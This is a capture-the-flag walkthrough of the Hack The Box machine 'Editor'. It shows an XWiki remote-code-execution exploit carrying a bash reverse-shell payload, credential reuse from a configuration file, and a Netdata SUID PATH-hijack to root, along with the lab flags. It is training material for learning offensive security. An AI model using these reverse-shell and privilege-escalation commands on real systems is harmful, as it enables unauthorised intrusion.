##
# 📝 Write-up: Editor HTB

![editor](https://www.hackthebox.com/storage/avatars/7d4a6dfe5b291cbe7b4e13e5f5c4d6c3.png)

**Difficulty:** Easy  
**Platform:** Hack The Box  
**Link:** [Editor @ HTB](https://app.hackthebox.com/machines/Editor)

---

## 🎯 Summary
Editor is an **easy Linux machine** that involves:  
- Exploiting an **XWiki RCE** (CVE-2025-24893) for initial access  
- Leveraging **password reuse** for horizontal privilege escalation  
- Abusing a **Netdata SUID binary** (CVE-2024-32019) to get root  

---

## 📋 Table of Contents
1. [Reconnaissance](#-reconnaissance)  
2. [Enumeration](#-enumeration)  
3. [Exploitation: Initial Foothold](#-exploitation-initial-foothold)  
4. [Privilege Escalation: User](#-privilege-escalation-to-user)  
5. [Privilege Escalation: Root](#-privilege-escalation-to-root)  
6. [Lessons Learned](#-lessons-learned)  
7. [References](#-references)  

---

## 🔍 Reconnaissance

Started with a **full port scan** using `nmap`:

```bash
nmap -sC -sV -oA nmap/initial 10.10.11.80


PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express server)
3306/tcp open  mysql   MySQL 8.0.35-0ubuntu0.20.04.1
8000/tcp open  http    nginx 1.18.0 (Ubuntu)
9000/tcp open  http    Netdata Go.d.plugin 1.32.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
```

## 🕵️ Enumeration

### 🌐 Ports 80 / 8000 — HTTP Servers
- **Port 80** → Hosts a static page with project documentation.  
- **Port 8000** → Runs **XWiki 14.10.5**, a Java-based wiki platform.  

### ⚡ Port 3000 — Express Server
- Node.js application with login functionality.  
- Discovered **default credentials**: admin:admin

→ Grants access to project management dashboard.  

### 📊 Port 9000 — Netdata
- Running **Netdata 1.32.1** (real-time performance monitoring tool).  
- Vulnerable to **CVE-2024-32019** → SUID privilege escalation.  


## 🚀 Exploitation
###  CVE-2025-24893 - XWiki RCE
- Exploit Used: https://github.com/gunzf0x/CVE-2025-24893

 ``` bash
python3 exploit.py -t http://editor.htb:8080 -c 'bash -i >& /dev/tcp/<YOuR_IP>/4444 0>&1'
```


## 🔼 Privilege Escalation: User

### 🔑 Password Reuse

Database credentials were found in the XWiki configuration file.  

**Location:**  
``` bash 
/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml 
```

**Credentials:**
```xml
<property name="hibernate.connection.password">theEd1t0rTeam99</property>
```
### SSH Access:
``` bash
ssh oliver@editor.htb
# Password: theEd1t0rTeam99
```
**User flag:**
**bc2341152c638da4a05b91d91c1df26f** 

## 🚀 Privilege Escalation: to Root
### CVE-2024-32019 - Netdata ndsudo Privilege Escalation
Abused SUID binary /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo for PATH hijacking.

#### Exploitation Steps:

- 1 Create malicious binary:

```bash
echo 'int main(){setuid(0);system("/bin/bash");}' > /tmp/nvme-list.c
gcc /tmp/nvme-list.c -o /tmp/nvme-list
```

- 2 Hijack PATH and execute:
``` bash 
export PATH=/tmp:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

**Result: Gained root shell access.**

**Root Flag: 6d4d6c2368c3210994e624647c93119f**

## Bingo! I'm a root! 